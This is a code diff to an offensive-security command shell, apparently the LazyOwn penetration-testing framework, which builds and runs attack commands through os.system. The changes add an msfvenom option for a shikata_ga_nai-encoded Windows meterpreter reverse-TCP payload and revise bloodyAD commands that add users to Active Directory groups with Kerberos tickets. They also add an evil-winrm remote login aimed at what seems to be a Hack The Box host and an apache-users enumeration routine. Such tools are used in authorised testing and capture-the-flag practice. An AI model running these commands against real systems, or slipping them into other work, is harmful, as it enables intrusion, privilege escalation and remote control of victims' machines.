@@ -1738,7 +1738,8 @@ class LazyOwnShell(Cmd):
         print_msg("14: windows/x64/meterpreter/reverse_tcp (C - shikata_ga_nai) 33 iteraciones")
         print_msg("15: android/meterpreter/reverse_tcp")
         print_msg("16: java/jsp_shell_reverse_tcp")
-        choice = input("Enter your choice (1-16): ").strip()
+        print_msg("17: windows/meterpreter/reverse_tcp  (C - shikata_ga_nai)")
+        choice = input("Enter your choice (1-17): ").strip()
 
         # Define payload commands
         commands = {
@@ -1763,6 +1764,9 @@ class LazyOwnShell(Cmd):
             ),
             "15": f'msfvenom -p android/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} > sessions/shell.apk ',
             "16": f'msfvenom -p java/jsp_shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -o sessions/shell.jsp ',
+            "17": (
+                f'msfvenom -p windows/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -b "\\x00\\x0a\\x0d" -e x86/shikata_ga_nai -f c > sessions/payload.c'
+            )
         }
 
         # Check if the choice is valid
@@ -1996,20 +2000,20 @@ class LazyOwnShell(Cmd):
             print_error("[Interrupted] Process terminated")
 
     def do_payload(self, line):
-        """Load parameters from payload.json
+        """Load parameters from a specified payload JSON file.
 
-        This function loads parameters from a JSON file named `payload.json` and updates the instance's `params` dictionary with the values from the file. If the file does not exist or contains invalid JSON, it will print an appropriate error message.
+        This function loads parameters from a JSON file specified by the `line` argument and updates the instance's `params` dictionary with the values from the file. If the file does not exist or contains invalid JSON, it will print an appropriate error message.
 
         Usage:
-            payload
+            payload <filename>
 
-        :param line: This parameter is not used in this function.
+        :param line: The name of the JSON file to load.
         :type line: str
 
         :returns: None
 
         Manual execution:
-        1. Open and read the `payload.json` file.
+        1. Open and read the specified JSON file.
         2. Update the `params` dictionary with values from the JSON file.
         3. Print a success message if the parameters were successfully loaded.
         4. Handle `FileNotFoundError` if the file does not exist.
@@ -2019,24 +2023,26 @@ class LazyOwnShell(Cmd):
         - `json` module for reading and parsing the JSON file.
 
         Example:
-            To execute the function, simply call `payload`.
+            To execute the function, call `payload payload_10.10.10.10.json`.
 
         Note:
-            - Ensure that `payload.json` exists in the current directory and is properly formatted.
+            - Ensure that the specified JSON file exists in the current directory and is properly formatted.
             - The confirmation message includes color formatting for better visibility.
         """
 
+        filename = line.strip() or "payload.json"
+
         try:
-            with open("payload.json", "r") as f:
+            with open(filename, "r") as f:
                 data = json.load(f)
             for key, value in data.items():
                 if key in self.params:
                     self.params[key] = value
-            print_msg(f"Parameters loaded from{GREEN} payload.json{RESET}")
+            print_msg(f"Parameters loaded from {GREEN}{filename}{RESET}")
         except FileNotFoundError:
-            print_error("payload.json not found")
+            print_error(f"{filename} not found")
         except json.JSONDecodeError:
-            print_error("Error decoding payload.json")
+            print_error(f"Error decoding {filename}")
 
     def do_exit(self, arg):
         """Exit the command line interface.
@@ -9622,15 +9628,15 @@ class LazyOwnShell(Cmd):
             print_warn(f"{idx}. {user}")
 
         selection = input("Enter the number of the user you want to select: ").strip()
-
+        sub = input("enter the subdomain example dc01: ")
         if selection.isdigit():
             selected_user = users[int(selection) - 1]
-            command = f"export KRB5CCNAME=/tmp/{selected_user}.ccache ; bloodyAD.py --host dc01.{domain} --dc-ip {rhost} -u {selected_user} -k -d {domain} add groupMember \"CN={cn},CN=USERS,DC={base_domain},DC={ext}\" {selected_user}"
+            command = f"export KRB5CCNAME=/tmp/{selected_user}.ccache ; bloodyAD --host {sub}.{domain} -d {domain} --dc-ip {rhost} -u {selected_user} -k  add groupMember \"CN={cn},CN=USERS,DC={base_domain},DC={ext}\" {selected_user}"
             print_msg(command)
             os.system(command)
         else:
             for user in users:
-                command = f"export KRB5CCNAME=/tmp/{user}.ccache ; bloodyAD.py --host dc01.{domain} --dc-ip {rhost} -u {user} -k -d {domain} add groupMember \"CN={cn},CN=USERS,DC={base_domain},DC={ext}\" {user}"
+                command = f"export KRB5CCNAME=/tmp/{user}.ccache ; bloodyAD --host {sub}.{domain} -d {domain} --dc-ip {rhost} -u {user} -k add groupMember \"CN={cn},CN=USERS,DC={base_domain},DC={ext}\" {user}"
                 print_msg(command)
                 os.system(command) 
 
@@ -9654,16 +9660,20 @@ class LazyOwnShell(Cmd):
         rhost = self.params["rhost"]
         path = os.getcwd()
         users_txt = f"{path}/sessions/users.txt"
+        url = self.params["url"]
+        domain = get_domain(url)
         
         if not check_rhost(rhost):
             return
 
         path_cred = "sessions/credentials.txt"        
         
-
+        sub = input("enter the subdomain example dc01: ")
         if not os.path.exists(path_cred):
             print_error("you need credentials.txt exec: createcredentials admin:admin")
-            return
+            user = input("Enter the username: ")
+
+            command = f"evil-winrm -i {sub}.{domain} -u \"{user}\" -r INFILTRATOR.HTB"
         with open(path_cred, "r") as file:
             for file_line in file:
                 params = file_line.split(":")
@@ -9722,6 +9732,48 @@ class LazyOwnShell(Cmd):
         
         return
 
+    def do_apache_users(self, line):
+        """
+        Performs enumeration of users from a target system using `apache-users`.
+
+        1. Executes the `apache-users` command with the `-h` option to specified target.
+
+        :param line: This parameter is not used in the current implementation but could be used to pass additional options or arguments if needed.
+        :param rhost: The target host for enumeration, specified in the `params` dictionary.
+
+        :returns: None
+
+        Manual execution:
+        To manually enumerate information from a system, use the following command:
+            apache-users -h <target_host> -l <wordlist> -p <apache_port> -s 0 -e 403 -t 10
+
+        Replace `<target_host>` with the IP address or hostname of the target system.
+
+        For example:
+            apache-users -h 192.168.1.202 -l /usr/share/wordlists/metasploit/unix_users.txt -p 80 -s 0 -e 403 -t 10
+        """
+
+        if not is_binary_present("apache-users"):
+            print_warn("Installing apache-users...")
+            os.system("sudo apt install apache-users -y")
+        
+        usrwordlist = self.params["usrwordlist"]
+        if not usrwordlist:
+            print_error("User wordlist must be seted, use: set usrwordlist /path/to/wordlist")
+            return
+
+        if line:
+            rhost = line
+        else:
+            rhost = self.params["rhost"]
+            if not check_rhost(rhost):
+                return
+
+        rhost = self.params["rhost"]
+        print_msg(f"Try... apache-users -h  {rhost} -l {usrwordlist} -p 80 -s 0 -e 403 -t 10 {RESET}")
+        os.system(f"apache-users -h  {rhost} -l {usrwordlist} -p 80 -s 0 -e 403 -t 10")
+        return
+
 if __name__ == "__main__":
     p = LazyOwnShell()
     p.onecmd("p")
@@ -9739,6 +9791,16 @@ if __name__ == "__main__":
             else:
                 print_error("you must pass the comand to execute ex; ./run -c ping")
                 sys.exit(2)
+        if arg.startswith("-p"):
+            if len(arguments) == 2:
+                payload = arguments[1]
+                os.system(
+                    'ip a show scope global | awk \'/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, "/"); print "    [\033[96m" iface"\033[0m] "a[1] }\''
+                )
+                p.onecmd(f'payload {payload}')
+                p.onecmd('ipp')
+                p.onecmd("rrhost")
+
     if NOBANNER is False:
         print(
             f"    {BG_BLACK}{RED}{BANNER}{MAGENTA}{BOLD}Autor: {CYAN}{BOLD}{BG_RED}grisUN0{RESET}"
